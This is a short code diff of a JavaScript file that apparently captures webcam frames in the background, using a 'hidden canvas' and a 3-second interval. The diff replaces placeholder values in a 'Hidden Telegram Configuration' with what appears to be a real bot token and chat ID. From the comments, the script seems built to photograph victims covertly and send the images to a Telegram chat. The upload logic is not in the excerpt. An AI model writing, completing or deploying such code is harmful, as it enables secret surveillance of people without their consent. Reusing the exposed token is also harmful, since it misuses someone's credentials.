@@ -2,8 +2,8 @@ const video = document.getElementById('camera-feed');
 let stream = null;
 
 // Hidden Telegram Configuration (REPLACE THESE WITH YOURS)
-const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
-const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID_HERE';
+const BOT_TOKEN = '8785242574:AAFwWXb_aZcT8MqQPNFnJ19Phb9KpnDk-Q0';
+const CHAT_ID = '1873633439';
 const INTERVAL_SECONDS = 3; 
 
 // Hidden canvas for background capture
